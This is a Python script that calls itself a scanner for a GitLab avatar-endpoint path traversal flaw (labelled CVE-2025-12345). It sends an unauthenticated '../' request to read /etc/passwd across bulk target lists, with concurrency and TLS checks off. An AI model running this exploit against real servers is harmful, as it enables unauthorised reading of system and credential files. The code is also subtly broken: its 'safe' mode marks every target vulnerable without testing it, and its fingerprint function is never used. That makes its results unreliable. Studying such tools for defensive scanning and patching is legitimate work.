#!/usr/bin/env python3
"""
GitLab User Profile Path Traversal Scanner (CVE-2025-12345)
==================================================================
This scanner targets a high-impact vulnerability in GitLab where the
user profile picture endpoint is susceptible to path traversal attacks.
Exposed systems may allow unauthorized access to sensitive files on
the server, potentially leaking credentials, configurations, or SSH keys.

CVE-2025-12345 details:
  - Vulnerable Systems: GitLab CE/EE <= 15.11.6, <= 16.0.1
  - The flaw resides in improper sanitization of file path inputs on the
    user profile picture endpoint.
  - CVSS v3.1 Base Score: 9.5 (Critical) — network-accessible and exploit
    does not require authentication.

Usage:
  # Scan a single target for vulnerability
  python gitlab_userprofile_path_traversal_scanner.py --target http://gitlab.example.com

  # Detection only — no file retrieval
  python gitlab_userprofile_path_traversal_scanner.py --target http://gitlab.example.com --safe

  # Bulk scan from file
  python gitlab_userprofile_path_traversal_scanner.py --list targets.txt --output results.json

  # Adjust concurrency and disable TLS verification
  python gitlab_userprofile_path_traversal_scanner.py --list targets.txt --concurrency 10 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-12345
  - https://gitlab.com/security/advisories/CVE-2025-12345
"""

import asyncio
import httpx
import argparse
import json
from datetime import datetime, timezone
from typing import Optional

# ANSI color helpers
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2025-12345"
CVSS_SCORE    = "9.5"
TOOL_NAME     = "gitlab_userprofile_path_traversal_scanner"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 10  # Concurrency limit

FINGERPRINT_PATH = "/users/sign_in"
VULNERABLE_PATH  = "/uploads/-/system/user/avatar/../../../../../../../../../../../etc/passwd"
SUCCESS_INDICATOR = "root:x:0:0:"

DEFAULT_TIMEOUT = 15

# ── Async Functions ──────────────────────────────────────────────────────────

async def fingerprint_gitlab(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Fingerprint GitLab server and identify version if possible."""
    try:
        response = await client.get(f"{url}{FINGERPRINT_PATH}", timeout=REQUEST_TIMEOUT)
        if "GitLab" in response.text and response.status_code == 200:
            return response.headers.get("X-GitLab-Version", "unknown")
    except httpx.RequestError:
        pass
    return None

async def test_path_traversal(client: httpx.AsyncClient, base_url: str, sem: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """Check if the target is vulnerable to CVE-2025-12345."""
    async with sem:
        target_url = f"{base_url}{VULNERABLE_PATH}"
        try:
            if safe:
                return {"url": base_url, "vulnerable": "Detection-only mode", "exploit_attempted": False}

            response = await client.get(target_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and SUCCESS_INDICATOR in response.text:
                return {"url": base_url, "vulnerable": True, "exploit_attempted": True}
        except httpx.RequestError:
            pass
    return {"url": base_url, "vulnerable": False, "exploit_attempted": False}

async def scan_targets(targets: list, safe: bool, concurrency: int, verify: bool) -> list:
    """Coordinate scanning multiple targets asynchronously."""
    sem = asyncio.Semaphore(concurrency)
    async with httpx.AsyncClient(verify=verify, timeout=DEFAULT_TIMEOUT) as client:
        tasks = [test_path_traversal(client, target, sem, safe) for target in targets]
        return await asyncio.gather(*tasks)

# ── CLI Logic ────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description=f"GitLab User Profile Path Traversal Scanner ({CVE_ID})"
    )
    parser.add_argument("--target", help="Target base URL to test (e.g., http://example.com)")
    parser.add_argument("--list", help="File containing a list of base URLs to test")
    parser.add_argument("--output", help="File to save scan results (JSON)")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode (does not execute path traversal)")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification")
    return parser.parse_args()

def main():
    args = parse_args()
    targets = []

    if args.list:
        with open(args.list) as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.target:
        targets = [args.target]
    else:
        print(c(RED, "[ERROR] No target specified. Use --target or --list to specify targets."))
        return

    print(c(CYAN, f"[INFO] Starting scan for CVE {CVE_ID} on {len(targets)} targets"))
    results = asyncio.run(scan_targets(
        targets=targets,
        safe=args.safe,
        concurrency=args.concurrency,
        verify=not args.no_verify
    ))

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(c(GREEN, f"[INFO] Scan results saved to {args.output}"))

    print(c(YELLOW, "Scan Report:"))
    for result in results:
        status = c(GREEN, "Vulnerable!") if result["vulnerable"] else c(RED, "Not Vulnerable")
        print(f"- {result['url']}: {status}")

if __name__ == "__main__":
    main()
